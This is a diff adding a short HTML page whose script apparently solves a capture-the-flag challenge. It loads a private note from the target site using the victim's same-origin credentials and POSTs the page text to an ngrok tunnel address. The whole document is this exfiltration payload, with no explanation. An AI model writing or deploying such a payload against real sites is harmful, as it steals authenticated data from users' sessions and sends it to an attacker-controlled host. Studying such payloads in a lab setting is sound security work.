@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+  <body></body>
+  <script>
+    fetch("https://notes.qualif.hackerlab.bj/note.php?id=845", {
+        credentials: "same-origin"
+    })
+    .then(response => response.text())
+    .then(function (data) {
+        fetch("http://2.tcp.eu.ngrok.io:15617/", {
+            method: "POST",
+            body: data
+        })
+    })
+  </script>
+</html>
